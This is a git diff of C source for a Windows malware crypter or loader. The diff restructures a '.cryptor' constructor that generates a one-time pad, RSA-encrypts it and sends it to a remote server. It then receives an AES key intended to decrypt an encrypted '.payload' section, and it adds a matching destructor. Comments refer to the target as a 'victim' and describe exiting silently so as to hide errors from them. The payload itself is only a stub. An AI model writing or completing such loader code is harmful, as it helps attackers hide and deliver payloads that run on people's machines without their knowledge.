@@ -8,9 +8,38 @@
 #include <ws2tcpip.h>
 #include <bcrypt.h>
 #include <ntstatus.h>
+/*
+ * this socket is connected in the .cryptor construct function and shutdown in the .cryptor destruct function.
+ */
+SOCKET Connection; 
 
-
-__attribute__((constructor, section(".cryptor"))) int construct(){
+BCRYPT_KEY_HANDLE bcrypt_key_handle_rsa;
+ 
+/*
+ * This Constructor is responsible for the following tasks
+ * 	- Generating a One Time Pad
+ * 	- RSA encrypting the generated One Time Pad
+ * 	- Sending the encrypted One Time Pad to the server
+ * 	- Detrieving an AES key encoded with the One Time Pad
+ * 	- Decoding the AES key
+ *	- Decrypting the .payload section
+ * if this function is successful then a WINSOC ("Connection") will be constructed for the payload environment
+ * this socket will be closed in the destructor.
+ *
+ * this function will also populate a handle to a BCRYPT_KEY_HANDLE for rsa encryption (" bcrypt_key_handle_rsa"), this 
+ * handle will be destroyed in the destructor. 
+ *
+ * the Connection socket and the bcrypt_key_handle_rsa constructs will be utilized in a priority 2 constructor belonging to the 
+ * .payload section to  initiate a secure_send, and secure_recieve function 
+ *
+ * this function is long but has a narrow focus on what is being accomplished, the outcomes of this function are used 
+ * in the remainder of the program, additional conmstructors will be created with lower priority values to set up
+ * cryptographically secure communication functions in the payload sections.
+ *
+ * Because this is the highest priority constructor in the runtime environment setup it is given priority 101, equvilant destructor priority
+ * is 101.
+ */
+__attribute__((constructor(101), section(".cryptor"))) int construct(){
 
 typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
 CIPKIE2 CryptImportPublicKeyInfoEx2;
@@ -66,11 +95,10 @@ if( CryptImport ) {
  */
     WSADATA  wsaData;
     struct addrinfo *result = NULL, init = {0};
-    SOCKET Connection;
-/*
- * retrieving the public key
- * in the event of an error silently exit 0. No reason to provide a return status to a victim
- */
+    /*
+     * retrieving the public key
+     * in the event of an error silently exit 0. No reason to provide a return status to a victim
+     */
    if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_ANY, NULL, &derPubKeyLen,NULL,NULL))
    {
 	DWORD err = GetLastError();   
@@ -78,7 +106,7 @@ if( CryptImport ) {
 	exit(0);
    }
    derPubKey = (BYTE*)malloc(derPubKeyLen);
-  if(!CryptStringToBinary(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
+   if(!CryptStringToBinary(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
    {
 	DWORD err = GetLastError();   
 	printf("failed to decode pem %d",err);
@@ -99,7 +127,7 @@ if( CryptImport ) {
 	    printf("Error DecodeObject: %d",err);
 	    exit(0);
     }
-    if(!CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING,PubKeyInfo,0, NULL,&hkey))
+    if(!CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING,PubKeyInfo,0, NULL,&bcrypt_key_handle_rsa))
     {
 	    DWORD err = GetLastError();
 	    printf("Error ImportPubKeyInfo: %d",err);
@@ -127,17 +155,12 @@ if( CryptImport ) {
 			printf("error closing handaler");
 			exit(0);
 		}
-
-	for( int x = 0 ; x<AESKEYLEN ; x++)
-	{
-		printf("0x%x ", *(OTP+x));
-	}
 	/*
  	* Encrypt the one time pad with the RSA key
  	*/
 		
 	
-	if(BCryptEncrypt(hkey,(PUCHAR)(OTP), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &EncryptedOTPLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
+	if(BCryptEncrypt( bcrypt_key_handle_rsa,(PUCHAR)(OTP), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &EncryptedOTPLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
 	{
 		printf("error in calculating RSA output key length.");
 		exit(0);
@@ -145,17 +168,9 @@ if( CryptImport ) {
 	/*
  	* Encrypt the one time pad with the RSA key
  	*/
-	if(BCryptEncrypt(hkey,(OTP), AESKEYLEN, NULL,NULL,0, EncryptedOTP,  EncryptedOTPLen, &EncryptedOTPWriteLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
+	if(BCryptEncrypt(bcrypt_key_handle_rsa,(OTP), AESKEYLEN, NULL,NULL,0, EncryptedOTP,  EncryptedOTPLen, &EncryptedOTPWriteLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
 	{
 		printf("ERROR IN ENCRYPTING");
-		exit(0);
-	}
-	/*
- 	* destroy are public key in a sane manner
- 	*/
-	
-	if(BCryptDestroyKey(hkey) != STATUS_SUCCESS){
-		printf("Error in destroying key");
 		exit(0);
 	}
 	/*
@@ -212,7 +227,18 @@ if( CryptImport ) {
 		printf("error sending EncryptedOTP (%d bytes).",EncryptedOTPWriteLen);
 		exit(-1);
 	}
-	closesocket(Connection);
+
+	recvData = realloc(recvData,AESKEYLEN+1);
+	if(!recv(Connection,recvData,AESKEYLEN,0))
+	{
+		exit(-1);
+	} 
+	
+	for( int x = 0 ; x<AESKEYLEN ; x++)
+	{
+		printf("0x%x ", *(recvData+x) ^ *(OTP+x));
+	}
+
 	/*
 	 * send the EncryptedOTP to the server
 	 */
@@ -234,6 +260,23 @@ if( CryptImport ) {
  *  RUN PAYLOAD
  */
 return 0;
+}
+
+__attribute__((destructor(101),section(".cryptor"))) int destruct(){
+	/*
+	 * close the WINSOC innitiated in the construct function
+	 */
+	closesocket(Connection);
+	/*
+ 	* destroy are public key in a sane manner
+ 	*/
+	
+	if(BCryptDestroyKey( bcrypt_key_handle_rsa) != STATUS_SUCCESS){
+		printf("Error in destroying key");
+		exit(0);
+	}
+	
+	return 0;
 }
 
 __attribute__((section(".payload"))) void payolad(){
